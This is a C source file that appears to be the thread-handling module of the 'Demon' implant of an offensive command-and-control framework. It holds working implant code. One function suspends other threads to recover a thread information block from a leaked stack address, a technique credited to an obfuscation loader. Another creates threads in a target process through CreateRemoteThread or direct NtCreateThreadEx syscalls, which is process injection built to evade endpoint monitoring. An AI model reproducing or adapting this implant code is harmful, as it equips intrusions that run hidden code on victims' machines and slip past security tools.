#include <Demon.h>
#include <Common/Macros.h>
#include <Core/Thread.h>
#include <Core/SysNative.h>
#include <Core/Win32.h>

/*!
 * queries the NT_TIB from the specified leaked thread RSP address
 *
 * NOTE:
 *  this function is entirely taken from Austins Hudson's implementation.
 *  reference: https://github.com/realoriginal/titanldr-ng/blob/master/Obf.c#L215
 *
 * @param Adr leaked rsp address
 * @param Tib random tib
 * @return
 */
BOOL ThreadQueryTib(
    IN  PVOID   Adr,
    OUT PNT_TIB Tib
) {
    THREAD_TEB_INFORMATION   ThdTebInfo = { 0 };
    MEMORY_BASIC_INFORMATION Memory1    = { 0 };
    MEMORY_BASIC_INFORMATION Memory2    = { 0 };
    CLIENT_ID                Client     = { 0 };
    CONTEXT                  ThdCtx     = { 0 };
    HANDLE                   ThdHndl    = NULL;
    HANDLE                   ThdNext    = NULL;
    BOOL                     Success    = FALSE;
    DWORD                    ThreadId   = 0;

    /* our current thread id */
    ThreadId            = U_PTR( Instance.Teb->ClientId.UniqueThread );
    ThdCtx.ContextFlags = CONTEXT_FULL;

    /* iterate over current process threads */
    while ( NT_SUCCESS( SysNtGetNextThread( NtCurrentProcess(), ThdHndl, THREAD_ALL_ACCESS, 0, 0, &ThdNext ) ) )
    {
        /* if the thread handle is valid close it */
        if ( ThdHndl ) {
            SysNtClose( ThdHndl );
        }

        /* set the next thread */
        ThdHndl = ThdNext;

        /* setup params we want to query */
        ThdTebInfo.TebOffset      = FIELD_OFFSET( TEB, ClientId );
        ThdTebInfo.BytesToRead    = sizeof( CLIENT_ID );
        ThdTebInfo.TebInformation = C_PTR( &Client );

        /* query information about the target thread */
        if ( NT_SUCCESS( SysNtQueryInformationThread( ThdHndl, ThreadTebInformation, &ThdTebInfo, sizeof( ThdTebInfo ), NULL ) ) )
        {
            /* if it's not our current thread then continue. */
            if ( ThreadId != U_PTR( Client.UniqueThread ) )
            {
                /* suspend target thread */
                if ( NT_SUCCESS( SysNtSuspendThread( ThdHndl, NULL ) ) )
                {
                    /* get target thread context  */
                    if ( NT_SUCCESS( SysNtGetContextThread( ThdHndl, &ThdCtx ) ) )
                    {
                        /* query memory info about rsp address */
#if _WIN64
                        if ( NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), C_PTR( ThdCtx.Rsp ), MemoryBasicInformation, &Memory1, sizeof( Memory1 ), NULL ) ) )
#else
                        if ( NT_SUCCESS( Instance.Win32.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( ThdCtx.Esp ), MemoryBasicInformation, &Memory1, sizeof( Memory1 ), NULL ) ) )
#endif
                        {
                            /* query memory info about rsp address */
                            if ( NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), Adr, MemoryBasicInformation, &Memory2, sizeof( Memory2 ), NULL ) ) )
                            {
                                /* check if it's the same region */
                                if ( U_PTR( Memory1.AllocationBase ) == U_PTR( Memory2.AllocationBase ) )
                                {
                                    /* setup params we want to query */
                                    ThdTebInfo.TebOffset      = FIELD_OFFSET( TEB, NtTib );
                                    ThdTebInfo.BytesToRead    = sizeof( NT_TIB );
                                    ThdTebInfo.TebInformation = C_PTR( Tib );

                                    /* Query information about the target thread */
                                    if ( NT_SUCCESS( SysNtQueryInformationThread( ThdHndl, ThreadTebInformation, &ThdTebInfo, sizeof( ThdTebInfo ), NULL ) ) ) {
                                        Success = TRUE;
                                    }
                                }
                            }
                        }
                    }

                    /* resume target thread */
                    SysNtResumeThread( ThdHndl, NULL );
                }
            }
        }

        /* did we successfully retrieve Tib ?
         * if yes then break loop. we got what we wanted */
        if ( Success ) {
            break;
        }
    }

    /* if the thread handle is valid close it */
    if ( ThdHndl ) {
        SysNtClose( ThdHndl );
        ThdHndl = NULL;
    }

    return Success;
}

HANDLE ThreadCreate(
    IN  BYTE   Method,
    IN  HANDLE Process,
    IN  PVOID  Entry,
    IN  PVOID  Arg,
    OUT PDWORD ThreadId
) {
    HANDLE Thread = NULL;

    switch ( Method )
    {
        case THREAD_METHOD_DEFAULT: {
            return ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, Process, Entry, Arg, ThreadId );
        }

        case THREAD_METHOD_CREATEREMOTETHREAD: {
            Thread = Instance.Win32.CreateRemoteThread( Process, NULL, 0, Entry, Arg, 0, ThreadId );
            break;
        }

        case THREAD_METHOD_NTCREATEHREADEX: {
            NTSTATUS      NtStatus   = STATUS_SUCCESS;
            THD_ATTR_LIST ThreadAttr = { 0 };
            CLIENT_ID     Client     = { 0 };

            /* thread attribute to get the thread id*/
            ThreadAttr.Entry.Attribute = ProcThreadAttributeValue( PsAttributeClientId, TRUE, FALSE, FALSE );
            ThreadAttr.Entry.Size      = sizeof( CLIENT_ID );
            ThreadAttr.Entry.pValue    = C_PTR( &Client );
            ThreadAttr.Length          = sizeof( PROC_THREAD_ATTRIBUTE_LIST );

            /* execute the code by creating a new thread */
            NtStatus = SysNtCreateThreadEx( &Thread, THREAD_ALL_ACCESS, NULL, Process, Entry, Arg, FALSE, 0, 0, 0, &ThreadAttr );
            if ( NT_SUCCESS( NtStatus ) ) {
                if ( ThreadId ) {
                    *ThreadId = U_PTR( Client.UniqueThread );
                }
            } else {
                PRINTF( "Failed to create new thread => NtStatus:[%ld]", NtStatus );
                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            }

            break;
        }

        case THREAD_METHOD_NTQUEUEAPCTHREAD: {
            /* TODO: finish implementing it */
            break;
        }

        default: {
            PRINTF( "Technique not found => %d", Method )
            break;
        }
    }

    return Thread;
}